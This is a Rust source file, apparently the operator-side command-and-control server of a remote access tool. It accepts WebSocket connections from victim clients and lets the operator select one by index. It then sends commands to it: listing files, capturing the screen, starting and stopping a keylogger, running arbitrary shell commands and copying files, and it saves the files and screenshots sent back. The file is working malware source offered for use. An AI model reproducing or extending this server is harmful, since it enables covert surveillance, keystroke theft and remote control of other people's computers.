use std::collections::{HashMap};
use tokio::net::{TcpListener, TcpStream};
use tokio_tungstenite::{accept_async, tungstenite::Message, WebSocketStream};
use futures_util::{StreamExt, SinkExt};
use std::{io};
use std::net::{SocketAddr};
use std::sync::{Arc};
use futures_util::stream::SplitSink;
use tokio::fs::File;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
use tokio::sync::Mutex;
use serde::Deserialize;

#[derive(Deserialize)]
struct FileData {
    filename: String,
}

#[derive(Default)]
struct FileTransferState {
    waiting_for_meta: bool,
    waiting_for_file: bool,
    filename: Option<String>,
}

#[tokio::main]
async fn main() {
    let addr = "127.0.0.1:8085";
    let listener = TcpListener::bind(&addr).await.expect("Не удалось запустить сервер");
    let peoples: Arc<Mutex<HashMap<SocketAddr, Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>>> = Arc::new(Mutex::new(HashMap::new()));
    let client_addr = Arc::new(Mutex::new(None::<SocketAddr>));
    let nnpeople1 = Arc::clone(&peoples);
    let client_addr_clone = Arc::clone(&client_addr);
    tokio::spawn(handle_stdin(nnpeople1, client_addr_clone));

    println!("WebSocket сервер слушает на {}", addr);
    while let Ok((stream, addr)) = listener.accept().await{
        let nnpeople = Arc::clone(&peoples);
        tokio::spawn(handle_connections(stream, addr, nnpeople));
    }
}

async fn handle_stdin(
    peoples: Arc<Mutex<HashMap<SocketAddr, Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>>>,
    client_addr: Arc<Mutex<Option<SocketAddr>>>,
) {
    let mut stdin = io::stdin();
    let mut buff = String::new();

    loop {
        buff.clear();
        stdin.read_line(&mut buff).unwrap();
        let input = buff.trim();

        let mut peoples_lock = peoples.lock().await;
        let mut client_addr_lock = client_addr.lock().await;

        if client_addr_lock.is_some() && !input.starts_with("sel ") && input != "shows" {
            if let Some(selected_adress) = *client_addr_lock {
                if let Some(user_to_send) = peoples_lock.get(&selected_adress) {
                    println!("Отправка клиенту: {:?}", selected_adress);
                    let mut writer = user_to_send.lock().await;
                    if input == "ls" {
                        writer.send("ls".into()).await.unwrap();
                    } else if input == "screen" {
                        writer.send("screen".into()).await.unwrap();
                    } else if input == "keylog" {
                        writer.send("keylog".into()).await.unwrap();
                    } else if input == "keylog_stop" {
                        writer.send(Message::Text("keylog_stop".into())).await.unwrap();
                    } else if input.starts_with("cd ") || input.starts_with("cmd ") || input.starts_with("copy ") {
                        writer.send(input.into()).await.unwrap();
                    }
                }
            }
        } else if input.starts_with("sel ") {
            let index: usize = input.trim_start_matches("sel ").parse().unwrap_or(9999);
            let keys: Vec<SocketAddr> = peoples_lock.keys().cloned().collect();
            if let Some(addr) = keys.get(index) {
                *client_addr_lock = Some(*addr);
                println!("Выбран: {}", addr);
            } else {
                println!("Неверный индекс");
            }
        }else if input == "shows"{
            let keys: Vec<SocketAddr> = peoples_lock.keys().cloned().collect();
            for i in 0..keys.len(){
                println!("{} - {}", i, keys[i]);
            }
        } else if let Some(addr) = *client_addr_lock {
            if let Some(client) = peoples_lock.get(&addr) {
                let mut writer = client.lock().await;
                writer.send(Message::Text(input.into())).await.unwrap();
            }
        } else {
            println!("Нет выбранного клиента. Используй 'sel N'");
            for (i, addr) in peoples_lock.keys().enumerate() {
                println!("{}: {}", i, addr);
            }
        }
    }
}


async fn handle_connections(mut socket: TcpStream, addr: SocketAddr, peoples: Arc<Mutex<HashMap<SocketAddr, Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>>>){
    let ws_stream = accept_async(socket)
        .await
        .expect("Ошибка при WebSocket рукопожатии");

    println!("Новое подключение: {}", addr);
    let (mut write, mut read) = ws_stream.split();
    let write = Arc::new(Mutex::new(write));
    {
        let mut peoples_lock = peoples.lock().await;
        peoples_lock.insert(addr, Arc::clone(&write));
    }

    let state = Arc::new(Mutex::new(FileTransferState::default()));

    let write = Arc::clone(&write);
    let state = Arc::clone(&state);

    while let Some(Ok(msg)) = read.next().await {
        match msg {
            Message::Text(text) => {
                let mut state_lock = state.lock().await;
                if text == "copy_command" {
                    state_lock.waiting_for_meta = true;
                } else if state_lock.waiting_for_meta {
                    match serde_json::from_str::<FileData>(&text) {
                        Ok(meta) => {
                            state_lock.filename = Some(meta.filename);
                            state_lock.waiting_for_file = true;
                            state_lock.waiting_for_meta = false;
                        }
                        Err(e) => {
                            let mut write = write.lock().await;
                            let _ = write.send(Message::Text(format!("Ошибка: {}", e))).await;
                        }
                    }
                } else {
                    println!("{}", text);
                    let mut write = write.lock().await;
                    let _ = write.send(Message::Text(format!("Ты написал: {}", text))).await;
                }
            }

            Message::Binary(data) => {
                let mut state_lock = state.lock().await;

                if state_lock.waiting_for_file {
                    if let Some(filename) = &state_lock.filename {
                        match File::create(filename).await {
                            Ok(mut file) => {
                                if let Err(e) = file.write_all(&data).await {
                                    let mut write = write.lock().await;
                                    let _ = write.send(Message::Text(format!("Ошибка записи: {}", e))).await;
                                } else {
                                    println!("Файл успешно сохранён как {}", filename);
                                    let mut write = write.lock().await;
                                    let _ = write.send(Message::Text(format!("Файл {} получен!", filename))).await;
                                }
                            }
                            Err(e) => {
                                let mut write = write.lock().await;
                                let _ = write.send(Message::Text(format!("Ошибка создания файла: {}", e))).await;
                            }
                        }
                        // Сброс состояния
                        state_lock.waiting_for_file = false;
                        state_lock.filename = None;
                    }
                } else {
                    // Просто получен бинарный файл, сохраняем как received.png
                    let mut file = File::create("received.png").await.expect("Не удалось создать файл");
                    file.write_all(&data).await.expect("Ошибка записи в файл");

                    println!("Файл успешно сохранён как received.png");

                    let mut write = write.lock().await;
                    let _ = write.send(Message::Text("Файл получен!".into())).await;
                }
            }

            _ => {}
            }
        }

    {
        let mut peoples_lock = peoples.lock().await;
        peoples_lock.remove(&addr);
    }

}